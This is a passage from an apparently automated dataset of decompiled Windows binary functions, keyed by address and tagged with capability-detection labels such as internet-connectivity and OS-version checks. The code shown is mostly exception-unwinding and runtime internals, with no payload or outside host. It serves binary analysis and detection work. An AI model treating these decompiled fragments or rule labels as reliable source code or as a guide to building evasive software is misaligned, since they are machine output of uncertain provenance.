*(&stack0xfffffe20 + iVar2 + iVar8) = 0x436d50;\n                uVar6 = fcn.0042d480();\n                puVar10 = s;\n                uVar11 = *s;\n            }\n        }\n    }\n    else if ((uVar11 == 0) || (3 < uVar11)) {\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436a5e;\n        uVar6 = fcn.0042ed40();\n        uVar11 = *s;\n    }\n    else {\n        puVar10 = in_EAX + 0xb;\n        s = puVar10;\n        if ((in_EAX[0xb] == 0x5f) && (in_EAX[0xc] == 0x5a)) {\n            s = in_EAX + 0xd;\n            *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436c32;\n            fcn.0042ffd0();\n        }\n        else {\n            var_1bch = uVar15 >> 0x20;\n            var_1b4h_2 = extraout_ECX;\n            *(&stack0xfffffe24 + iVar2 + iVar8) = puVar10;\n            *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4369bb;\n            iVar5 = sub.msvcrt.dll_strlen();\n            if (0 < var_1b8h_2) {\n                *(var_1bch * 4 + 4) = 0;\n                var_188h_2 = 1;\n                if (iVar5 != 0) {\n                    *(var_1bch * 4 + 8) = puVar10;\n                    *(var_1bch * 4) = 0;\n                    *(var_1bch * 4 + 0xc) = iVar5;\n                }\n            }\n        }\n        *(&stack0xfffffe24 + iVar2 + iVar8) = 0;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436a2a;\n        uVar6 = fcn.0042d480();\n        puVar10 = s;\n        *(&stack0xfffffe24 + iVar2 + iVar8) = s;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436a3a;\n        iVar5 = sub.msvcrt.dll_strlen();\n        s = puVar10 + iVar5;\n        uVar11 = puVar10[iVar5];\n    }\n    if ((uVar6 != 0) && (uVar11 == 0)) {\n        uStack100 = 0;\n        var_64h_2 = 0;\n        var_5ch_2 = var_1ach_2;\n        uStack88 = 0;\n        var_58h_2 = iStack436;\n        uStack84 = 0;\n        uStack68 = 0;\n        uStack64 = 0;\n        var_4ch_2 = 0;\n        uStack76 = 0;\n        uStack72 = 0;\n        uStack60 = 0;\n        var_34h_2 = NULL;\n        uStack52 = 0;\n        iStack48 = 0;\n        var_28h_2 = NULL;\n        uStack40 = 0;\n        var_20h_2 = 0;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436b03;\n        fcn.0042d540();\n        uStack32 = 0;\n        var_1ach_2 = &stack0xfffffe24 + iVar2 + iVar8;\n        var_20h_2 = var_20h_2 * iStack48;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436b38;\n        iVar5 = fcn.00437ed0();\n        iVar5 = -iVar5;\n        *(&stack0xfffffe20 + iVar5 + iVar2 + iVar8) = 0x436b55;\n        iVar7 = fcn.00437ed0();\n        var_34h_2 = &stack0xfffffe30 + iVar5 + iVar2 + iVar8;\n        var_28h_2 = &stack0xfffffe30 + -iVar7 + iVar5 + iVar2 + iVar8;\n        *(&stack0xfffffe20 + -iVar7 + iVar5 + iVar2 + iVar8) = 0x436b6f;\n        fcn.004306e0();\n        iVar2 = var_58h_2;\n        iVar8 = var_64h_2;\n        piVar3 = var_1ach_2;\n        (&stack0xfffffe98)[var_64h_2] = 0;\n        var_1ach_2[2] = iVar2;\n        piVar3[1] = iVar8;\n        *piVar3 = &stack0xfffffe98;\n        pcVar4 = var_5ch_2;\n        piVar3[-1] = 0x436b91;\n        (*pcVar4)();\n        return var_4ch_2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 3306
    },
    "00436de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00436e4d)\n// WARNING: Removing unreachable block (ram,0x00436f1d)\n// WARNING: Removing unreachable block (ram,0x00436f21)\n// WARNING: Removing unreachable block (ram,0x00436eb4)\n// WARNING: Removing unreachable block (ram,0x00436e5a)\n// WARNING: Removing unreachable block (ram,0x00436ef0)\n// WARNING: Removing unreachable block (ram,0x00436ef8)\n// WARNING: Removing unreachable block (ram,0x00436e62)\n// WARNING: Removing unreachable block (ram,0x00436ee0)\n// WARNING: Removing unreachable block (ram,0x00436ee8)\n// WARNING: Removing unreachable block (ram,0x00436e72)\n// WARNING: Removing unreachable block (ram,0x00436e8f)\n// WARNING: Removing unreachable block (ram,0x00436e93)\n\nuint fcn.00436de0(int32_t param_1, int32_t param_2, int32_t param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    \n    if ((param_1 == 0) || ((param_2 != 0 && (param_3 == 0)))) {\n        if (param_4 != NULL) {\n            *param_4 = 0xfffffffd;\n        }\n    }\n    else {\n        iVar1 = fcn.00436850();\n        if (iVar1 == 0) {\n            fcn.00446e88(0);\n        }\n        if (param_4 != NULL) {\n            *param_4 = 0xfffffffe;\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 383
    },
    "004374d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00437538)\n// WARNING: Removing unreachable block (ram,0x00437601)\n// WARNING: Removing unreachable block (ram,0x00437547)\n// WARNING: Removing unreachable block (ram,0x00437685)\n// WARNING: Removing unreachable block (ram,0x00437693)\n// WARNING: Removing unreachable block (ram,0x00437736)\n// WARNING: Removing unreachable block (ram,0x004376a1)\n// WARNING: Removing unreachable block (ram,0x00437606)\n// WARNING: Removing unreachable block (ram,0x0043760e)\n// WARNING: Removing unreachable block (ram,0x00437619)\n// WARNING: Removing unreachable block (ram,0x00437740)\n// WARNING: Removing unreachable block (ram,0x004377b0)\n// WARNING: Removing unreachable block (ram,0x00437801)\n// WARNING: Removing unreachable block (ram,0x0043781a)\n// WARNING: Removing unreachable block (ram,0x004377b7)\n// WARNING: Removing unreachable block (ram,0x004377be)\n// WARNING: Removing unreachable block (ram,0x00437763)\n// WARNING: Removing unreachable block (ram,0x004377c5)\n// WARNING: Removing unreachable block (ram,0x00437885)\n// WARNING: Removing unreachable block (ram,0x004377e2)\n// WARNING: Removing unreachable block (ram,0x00437870)\n// WARNING: Removing unreachable block (ram,0x0043776a)\n// WARNING: Removing unreachable block (ram,0x00437835)\n// WARNING: Removing unreachable block (ram,0x0043783c)\n// WARNING: Removing unreachable block (ram,0x004378a5)\n// WARNING: Removing unreachable block (ram,0x00437855)\n// WARNING: Removing unreachable block (ram,0x00437859)\n// WARNING: Removing unreachable block (ram,0x00437775)\n// WARNING: Removing unreachable block (ram,0x004378be)\n// WARNING: Removing unreachable block (ram,0x00437792)\n// WARNING: Removing unreachable block (ram,0x00437796)\n// WARNING: Removing unreachable block (ram,0x004377ea)\n// WARNING: Removing unreachable block (ram,0x004377f7)\n// WARNING: Removing unreachable block (ram,0x004378e0)\n// WARNING: Removing unreachable block (ram,0x0043787e)\n// WARNING: Removing unreachable block (ram,0x00437625)\n// WARNING: Removing unreachable block (ram,0x00437634)\n// WARNING: Removing unreachable block (ram,0x00437640)\n// WARNING: Removing unreachable block (ram,0x004376b1)\n// WARNING: Removing unreachable block (ram,0x004376ca)\n// WARNING: Removing unreachable block (ram,0x004376cd)\n// WARNING: Removing unreachable block (ram,0x00437663)\n// WARNING: Removing unreachable block (ram,0x00437722)\n// WARNING: Removing unreachable block (ram,0x0043766c)\n// WARNING: Removing unreachable block (ram,0x00437675)\n// WARNING: Removing unreachable block (ram,0x00437700)\n// WARNING: Removing unreachable block (ram,0x0043770e)\n// WARNING: Removing unreachable block (ram,0x00437711)\n// WARNING: Removing unreachable block (ram,0x004376e3)\n// WARNING: Removing unreachable block (ram,0x004376f2)\n// WARNING: Removing unreachable block (ram,0x0043754f)\n// WARNING: Removing unreachable block (ram,0x00437554)\n// WARNING: Removing unreachable block (ram,0x0043755c)\n// WARNING: Removing unreachable block (ram,0x00437583)\n// WARNING: Removing unreachable block (ram,0x004375a8)\n// WARNING: Removing unreachable block (ram,0x004375ab)\n// WARNING: Removing unreachable block (ram,0x004375b9)\n// WARNING: Removing unreachable block (ram,0x004375c2)\n// WARNING: Removing unreachable block (ram,0x004375d4)\n// WARNING: Removing unreachable block (ram,0x004375ee)\n// WARNING: Removing unreachable block (ram,0x004375f9)\n// WARNING: Removing unreachable block (ram,0x00437580)\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.004374d0(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    if (*0x56b3bc == 0) {\n        *0x56b3bc = 1;\n        fcn.00437ce0();\n        iVar1 = fcn.00437ed0();\n        *0x56b3c0 = 0;\n        *0x56b3c4 = &var_2ch + (3 - iVar1) & 0xfffffff0;\n        in_EAX = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1162
    },
    "00438f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00438f10(uint param_1, int32_t **param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    code *pcVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t **ppiVar8;\n    uint8_t *puVar9;\n    uint *puVar10;\n    uint8_t uVar11;\n    uint8_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t extraout_ECX;\n    uint32_t uVar15;\n    uint8_t extraout_DL;\n    uint8_t *puVar16;\n    int32_t **ppiVar17;\n    char *pcVar18;\n    uint8_t *puVar19;\n    int32_t **ppiVar20;\n    int32_t *piVar21;\n    uint32_t uVar22;\n    ulong uVar23;\n    int32_t **ppiStack404;\n    uint uStack384;\n    int32_t **ppiStack380;\n    int32_t *apiStack376 [67];\n    int32_t **ppiStack108;\n    int32_t iStack104;\n    int32_t **ppiStack100;\n    int32_t **ppiStack96;\n    int32_t **ppiStack92;\n    int32_t iStack88;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t **ppiStack56;\n    int32_t iStack52;\n    uint8_t uStack45;\n    int32_t *piStack32;\n    \n    ppiVar8 = param_2;\n    for (iVar13 = 0x30; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *ppiVar8 = NULL;\n        ppiVar8 = ppiVar8 + 1;\n    }\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x50) = 0;\n    if (*(in_EAX + 0x4c) == 0) {\n        return 5;\n    }\n    iStack88 = in_EAX + 0x54;\n    iStack60 = *(in_EAX + 0x60);\n    ppiStack92 = (*(in_EAX + 0x4c) + -1) - (iStack60 >> 0x1f);\n    ppiStack96 = 0x438f60;\n    iStack64 = in_EAX;\n    iStack60 = fcn.0043c050();\n    if (iStack60 != 0) {\n        param_2[0x29] = *(iStack64 + 0x5c);\n        iVar13 = (iStack60 + 4) - *(iStack60 + 4);\n        ppiStack92 = iVar13 + 9;\n        ppiStack96 = 0x438f98;\n        ppiStack56 = ppiStack92;\n        iStack52 = iVar13;\n        iVar7 = sub.msvcrt.dll_strlen();\n        ppiVar8 = iVar13 + 10 + iVar7;\n        if ((*(iVar13 + 9) == 'e') && (*(iStack52 + 10) == 'h')) {\n            piVar21 = *ppiVar8;\n            ppiStack56 = iStack52 + 0xb;\n            ppiVar8 = ppiVar8 + 1;\n            param_2[0x2f] = piVar21;\n        }\n        uVar12 = *ppiVar8;\n        uStack45 = *(iStack52 + 8);\n        if (3 < uStack45) {\n            if (uVar12 != 4) {\n                return 3;\n            }\n            if (*(ppiVar8 + 1) != '\\0') {\n                return 3;\n            }\n            uVar12 = *(ppiVar8 + 2);\n            ppiVar8 = ppiVar8 + 2;\n        }\n        piVar21 = NULL;\n        uVar11 = 0;\n        while( true ) {\n            ppiVar8 = ppiVar8 + 1;\n            uVar3 = uVar11 & 0x1f;\n            uVar11 = uVar11 + 7;\n            piVar21 = piVar21 | (uVar12 & 0x7f) << uVar3;\n            if (-1 < uVar12) break;\n            uVar12 = *ppiVar8;\n        }\n        param_2[0x2c] = piVar21;\n        piVar21 = NULL;\n        uVar14 = 0;\n        do {\n            ppiVar17 = ppiVar8;\n            ppiVar8 = ppiVar17 + 1;\n            uVar12 = *ppiVar17;\n            uVar11 = uVar14;\n            uVar14 = uVar14 + 7;\n            piVar21 = piVar21 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n        } while (uVar12 < '\\0');\n        if ((uVar14 < 0x20) && ((uVar12 & 0x40) != 0)) {\n            piVar21 = piVar21 | -1 << (uVar14 & 0x1f);\n        }\n        uVar12 = 0;\n        param_2[0x2b] = piVar21;\n        if (uStack45 == 1) {\n            ppiVar17 = ppiVar17 + 2;\n            param_2[0x2d] = *ppiVar8;\n        }\n        else {\n            piVar21 = NULL;\n            do {\n                ppiVar17 = ppiVar8 + 1;\n                uVar11 = *ppiVar8;\n                uVar3 = uVar12 & 0x1f;\n                uVar12 = uVar12 + 7;\n                piVar21 = piVar21 | (uVar11 & 0x7f) << uVar3;\n                ppiVar8 = ppiVar17;\n            } while (uVar11 < '\\0');\n            param_2[0x2d] = piVar21;\n        }\n        *(param_2 + 0xb9) = 0xff;\n        cVar5 = *ppiStack56;\n        ppiStack108 = ppiVar17;\n        pcVar18 = ppiStack56;\n        ppiVar8 = NULL;\n        if (cVar5 == 'z') {\n            uVar14 = 0;\n            uVar12 = 0;\n            ppiVar8 = ppiVar17;\n            do {\n                ppiVar17 = ppiVar8 + 1;\n                uVar11 = *ppiVar8;\n                uVar3 = uVar12 & 0x1f;\n                uVar12 = uVar12 + 7;\n                uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                ppiVar8 = ppiVar17;\n            } while (uVar11 < '\\0');\n            *(param_2 + 0xba) = 1;\n            pcVar18 = ppiStack56 + 1;\n            cVar5 = *(ppiStack56 + 1);\n            ppiStack108 = ppiVar17;\n            ppiVar8 = ppiVar17 + uVar14;\n        }\n        while (ppiStack56 = ppiVar8,  iStack104 = iStack52,  cVar5 != '\\0') {\n            if (cVar5 == 'L') {\n                uVar1 = *ppiStack108;\n                ppiStack108 = ppiStack108 + 1;\n                *(param_2 + 0xb9) = uVar1;\n            }\n            else if (cVar5 == 'R') {\n                uVar1 = *ppiStack108;\n                ppiStack108 = ppiStack108 + 1;\n                *(param_2 + 0x2e) = uVar1;\n            }\n            else if (cVar5 == 'P') {\n                ppiVar17 = *ppiStack108;\n                ppiStack96 = 0x43911f;\n                fcn.00438670();\n                ppiStack92 = &stack0xffffffe0;\n                ppiStack96 = 0x439132;\n                ppiStack108 = fcn.00438530();\n                param_2[0x2a] = piStack32;\n            }\n            else {\n                ppiVar8 = ppiStack56;\n                if (cVar5 != 'S') goto code_r0x004392f4;\n                *(param_2 + 0xbb) = 1;\n            }\n            cVar5 = pcVar18[1];\n            pcVar18 = pcVar18 + 1;\n            ppiVar8 = ppiStack56;\n        }\n        ppiVar17 = ppiStack108;\n        ppiVar8 = ppiStack108;\n        ppiVar20 = ppiStack56;\n        if (ppiStack56 == NULL) {\ncode_r0x004392f4:\n            ppiStack108 = ppiVar17;\n            ppiVar20 = ppiVar8;\n            if (ppiVar8 == NULL) {\n                return 3;\n            }\n        }\n        ppiStack96 = 0x439169;\n        ppiStack92 = param_2;\n        fcn.004386b0();\n        if (*(param_2 + 0x2e) == 0xff) {\n            iVar13 = 8;\n        }\n        else {\n            uVar12 = *(param_2 + 0x2e) & 7;\n            if (uVar12 == 2) {\n                iVar13 = 0xc;\n            }\n            else {\n                if (uVar12 < 3) {\n                    if (uVar12 != 0) {\ncode_r0x00439528:\n                        ppiStack96 = 0x43952d;\n                        uVar23 = sub.msvcrt.dll_abort();\n                        puVar16 = uVar23 >> 0x20;\n                        ppiStack96 = ppiVar20;\n                        ppiStack100 = param_2;\n                        apiStack376[0] = iStack88;\n                        if (uVar23 < puVar16) {\n                            ppiStack404 = 0x1;\n                            puVar19 = uVar23;\n                            do {\n                                uVar12 = *puVar19;\n                                uVar14 = uVar12;\n                                puVar9 = puVar19 + 1;\n                                switch(uVar14 - 3 & 0xff) {\n                                case 0:\n                                case 9:\n                                case 10:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 5;\n                                    break;\n                                default:\ncode_r0x00439a29:\n                                    do {\n                                        sub.msvcrt.dll_abort();\n                                        uVar12 = extraout_DL;\ncode_r0x00439a30:\n                                        ppiStack404 = ppiVar20;\n                                        if (uVar12 == 6) {\n                                            param_2 = *param_2;\n                                            goto code_r0x00439590;\n                                        }\n                                    } while (uVar12 != 0x19);\n                                    param_2 = (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f);\n                                    break;\n                                case 3:\n                                case 0x16:\n                                case 0x1c:\n                                case 0x1d:\n                                case 0x20:\n                                case 0x91:\n                                    if (ppiStack404 == NULL) goto code_r0x004014e0;\n                                    ppiVar20 = ppiStack404 + -1;\n                                    param_2 = *(&stack0xfffffe88 + ppiVar20 * 4);\n                                    ppiStack404 = ppiVar20;\n                                    if (uVar12 == 0x1f) {\n                                        param_2 = -param_2;\n                                    }\n                                    else {\n                                        if (uVar12 < 0x20) goto code_r0x00439a30;\n                                        if (uVar12 == 0x23) {\n                                            uVar14 = 0;\n                                            uVar12 = 0;\n                                            puVar19 = puVar9;\n                                            do {\n                                                puVar9 = puVar19 + 1;\n                                                uVar11 = *puVar19;\n                                                uVar3 = uVar12 & 0x1f;\n                                                uVar12 = uVar12 + 7;\n                                                uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                                puVar19 = puVar9;\n                                            } while (uVar11 < '\\0');\n                                            param_2 = param_2 + uVar14;\n                                        }\n                                        else if (uVar12 == 0x94) {\n                                            uVar12 = puVar19[1];\n                                            puVar19 = puVar19 + 2;\n                                            if (uVar12 == 2) {\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                            else if (uVar12 < 3) {\n                                                if (uVar12 != 1) goto code_r0x00439a29;\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                            else {\n                                                if ((uVar12 != 4) && (uVar12 != 8)) goto code_r0x00439a29;\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                        }\n                                        else {\n                                            if (uVar12 != 0x20) goto code_r0x00439a29;\n                                            param_2 = ~param_2;\n                                        }\n                                    }\n                                    break;\n                                case 5:\n                                    param_2 = puVar19[1];\n                                    puVar9 = puVar19 + 2;\n                                    break;\n                                case 6:\n                                    param_2 = puVar19[1];\n                                    puVar9 = puVar19 + 2;\n                                    break;\n                                case 7:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 3;\n                                    break;\n                                case 8:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 3;\n                                    break;\n                                case 0xb:\n                                case 0xc:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 9;\n                                    break;\n                                case 0xd:\n                                    param_2 = NULL;\n                                    uVar12 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar11 = *puVar19;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 = uVar12 + 7;\n                                        param_2 = param_2 | (uVar11 & 0x7f) << uVar3;\n                                        puVar19 = puVar9;\n                                    } while (uVar11 < '\\0');\n                                    break;\n                                case 0xe:\n                                    param_2 = NULL;\n                                    uVar14 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = *puVar19;\n                                        uVar11 = uVar14;\n                                        uVar14 = uVar14 + 7;\n                                        param_2 = param_2 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar14 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        param_2 = param_2 | -(1 << (uVar14 & 0x1f));\n                                    }\n                                    break;\n                                case 0xf:\n                                    if (ppiStack404 == NULL) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                                    break;\n                                case 0x10:\n                                    if (ppiStack404 != NULL) {\n                                        ppiStack404 = ppiStack404 + -1;\n                                        goto code_r0x004395a4;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x11:\n                                    if (ppiStack404 < 2) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe80 + ppiStack404 * 4);\n                                    break;\n                                case 0x12:\n                                    puVar9 = puVar19 + 2;\n                                    if (ppiStack404 + -1 <= puVar19[1]) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe88 + ((ppiStack404 + -1) - puVar19[1]) * 4);\n                                    break;\n                                case 0x13:\n                                    if (1 < ppiStack404) {\n                                        uVar2 = *(&stack0xfffffe88 + (ppiStack404 + -1) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -1) * 4) =\n                                             *(&stack0xfffffe88 + (ppiStack404 + -2) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -2) * 4) = uVar2;\n                                        goto code_r0x004395a4;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x14:\n                                    if (2 < ppiStack404) {\n                                        uVar2 = *(&stack0xfffffe88 + (ppiStack404 + -1) * 4);\n                                        ppiVar20 = *(&stack0xfffffe88 + (ppiStack404 + -2) * 4);\n                                        param_2 = *(&stack0xfffffe88 + (ppiStack404 + -3) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -1) * 4) = ppiVar20;\n                                        *(&stack0xfffffe88 + (ppiStack404 + -2) * 4) = param_2;\n                                        *(&stack0xfffffe88 + (ppiStack404 + -3) * 4) = uVar2;\n                                        goto code_r0x004395a4;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x17:\n                                case 0x18:\n                                case 0x19:\n                                case 0x1a:\n                                case 0x1b:\n                                case 0x1e:\n                                case 0x1f:\n                                case 0x21:\n                                case 0x22:\n                                case 0x23:\n                                case 0x24:\n                                case 0x26:\n                                case 0x27:\n                                case 0x28:\n                                case 0x29:\n                                case 0x2a:\n                                case 0x2b:\n                                    if (ppiStack404 < 2) goto code_r0x004014e0;\n                                    ppiVar20 = ppiStack404 + -2;\n                                    ppiVar8 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                                    param_2 = *(&stack0xfffffe88 + ppiVar20 * 4);\n                                    uVar12 = ppiVar8;\n                                    ppiStack404 = ppiVar20;\n                                    switch(uVar14 - 0x1a & 0xff) {\n                                    case 0:\n                                        param_2 = param_2 & ppiVar8;\n                                        break;\n                                    case 1:\n                                        param_2 = param_2 / ppiVar8;\n                                        break;\n                                    case 2:\n                                        param_2 = param_2 - ppiVar8;\n                                        break;\n                                    case 3:\n                                        param_2 = param_2 % ppiVar8;\n                                        break;\n                                    case 4:\n                                        param_2 = param_2 * ppiVar8;\n                                        break;\n                                    default:\n                                        goto code_r0x00439a29;\n                                    case 7:\n                                        param_2 = param_2 | ppiVar8;\n                                        break;\n                                    case 8:\n                                        param_2 = param_2 + ppiVar8;\n                                        break;\n                                    case 10:\n                                        param_2 = param_2 << (uVar12 & 0x1f);\n                                        break;\n                                    case 0xb:\n                                        param_2 = param_2 >> (uVar12 & 0x1f);\n                                        break;\n                                    case 0xc:\n                                        param_2 = param_2 >> (uVar12 & 0x1f);\n                                        break;\n                                    case 0xd:\n                                        param_2 = param_2 ^ ppiVar8;\n                                        break;\n                                    case 0xf:\n                                        param_2 = param_2 == ppiVar8;\n                                        break;\n                                    case 0x10:\n                                        param_2 = ppiVar8 <= param_2;\n                                        break;\n                                    case 0x11:\n                                        param_2 = ppiVar8 < param_2;\n                                        break;\n                                    case 0x12:\n                                        param_2 = param_2 <= ppiVar8;\n                                        break;\n                                    case 0x13:\n                                        param_2 = param_2 < ppiVar8;\n                                        break;\n                                    case 0x14:\n                                        param_2 = param_2 != ppiVar8;\n                                    }\n                                    break;\n                                case 0x25:\n                                    if (ppiStack404 != NULL) {\n                                        param_2 = ppiStack404 + -1;\n                                        puVar9 = puVar19 + 3;\n                                        ppiStack404 = param_2;\n                                        if (*(&stack0xfffffe88 + param_2 * 4) != 0) {\n                                            puVar9 = puVar9 + *(puVar19 + 1);\n                                        }\n                                        goto code_r0x004395a4;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x2c:\n                                    puVar9 = puVar19 + *(puVar19 + 1) + 3;\n                                    goto code_r0x004395a4;\n                                case 0x2d:\n                                case 0x2e:\n                                case 0x2f:\n                                case 0x30:\n                                case 0x31:\n                                case 0x32:\n                                case 0x33:\n                                case 0x34:\n                                case 0x35:\n                                case 0x36:\n                                case 0x37:\n                                case 0x38:\n                                case 0x39:\n                                case 0x3a:\n                                case 0x3b:\n                                case 0x3c:\n                                case 0x3d:\n                                case 0x3e:\n                                case 0x3f:\n                                case 0x40:\n                                case 0x41:\n                                case 0x42:\n                                case 0x43:\n                                case 0x44:\n                                case 0x45:\n                                case 0x46:\n                                case 0x47:\n                                case 0x48:\n                                case 0x49:\n                                case 0x4a:\n                                case 0x4b:\n                                case 0x4c:\n                                    param_2 = uVar14 - 0x30;\n                                    break;\n                                case 0x4d:\n                                case 0x4e:\n                                case 0x4f:\n                                case 0x50:\n                                case 0x51:\n                                case 0x52:\n                                case 0x53:\n                                case 0x54:\n                                case 0x55:\n                                case 0x56:\n                                case 0x57:\n                                case 0x58:\n                                case 0x59:\n                                case 0x5a:\n                                case 0x5b:\n                                case 0x5c:\n                                case 0x5d:\n                                case 0x5e:\n                                case 0x5f:\n                                case 0x60:\n                                case 0x61:\n                                case 0x62:\n                                case 99:\n                                case 100:\n                                case 0x65:\n                                case 0x66:\n                                case 0x67:\n                                case 0x68:\n                                case 0x69:\n                                case 0x6a:\n                                case 0x6b:\n                                case 0x6c:\n                                    iVar13 = uVar14 - 0x50;\n                                    if (0x11 < iVar13) goto code_r0x004014e0;\n                                    param_2 = *(extraout_ECX + iVar13 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + iVar13) == '\\0')) {\n                                        if (*(uVar14 + 0x56b3a4) != '\\x04') goto code_r0x004014e0;\ncode_r0x004396ec:\n                                        param_2 = *param_2;\n                                    }\n                                    break;\n                                case 0x6d:\n                                case 0x6e:\n                                case 0x6f:\n                                case 0x70:\n                                case 0x71:\n                                case 0x72:\n                                case 0x73:\n                                case 0x74:\n                                case 0x75:\n                                case 0x76:\n                                case 0x77:\n                                case 0x78:\n                                case 0x79:\n                                case 0x7a:\n                                case 0x7b:\n                                case 0x7c:\n                                case 0x7d:\n                                case 0x7e:\n                                case 0x7f:\n                                case 0x80:\n                                case 0x81:\n                                case 0x82:\n                                case 0x83:\n                                case 0x84:\n                                case 0x85:\n                                case 0x86:\n                                case 0x87:\n                                case 0x88:\n                                case 0x89:\n                                case 0x8a:\n                                case 0x8b:\n                                case 0x8c:\n                                    uVar22 = 0;\n                                    uVar15 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = *puVar19;\n                                        uVar11 = uVar15;\n                                        uVar15 = uVar15 + 7;\n                                        uVar22 = uVar22 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar15 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        uVar22 = uVar22 | -(1 << (uVar15 & 0x1f));\n                                    }\n                                    iVar13 = uVar14 - 0x70;\n                                    if (0x11 < iVar13) goto code_r0x004014e0;\n                                    puVar10 = *(extraout_ECX + iVar13 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + iVar13) == '\\0')) {\n                                        if (*(uVar14 + 0x56b384) != '\\x04') goto code_r0x004014e0;\n                                        puVar10 = *puVar10;\n                                    }\n                                    param_2 = puVar10 + uVar22;\n                                    break;\n                                case 0x8d:\n                                    uVar14 = 0;\n                                    uVar12 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar11 = *puVar19;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 = uVar12 + 7;\n                                        uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                        puVar19 = puVar9;\n                                    } while (uVar11 < '\\0');\n                                    if (0x11 < uVar14) goto code_r0x004014e0;\n                                    param_2 = *(extraout_ECX + uVar14 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + uVar14) == '\\0')) {\n                                        if (*(uVar14 + 0x56b3f4) == '\\x04') goto code_r0x004396ec;\n                                        goto code_r0x004014e0;\n                                    }\n                                    break;\n                                case 0x8f:\n                                    uVar14 = 0;\n                                    uVar12 = 0;\n                                    do {\n                                        puVar19 = puVar9 + 1;\n                                        uVar11 = *puVar9;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 = uVar12 + 7;\n                                        uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                        puVar9 = puVar19;\n                                    } while (uVar11 < '\\0');\n                                    uVar22 = 0;\n                                    uVar15 = 0;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = 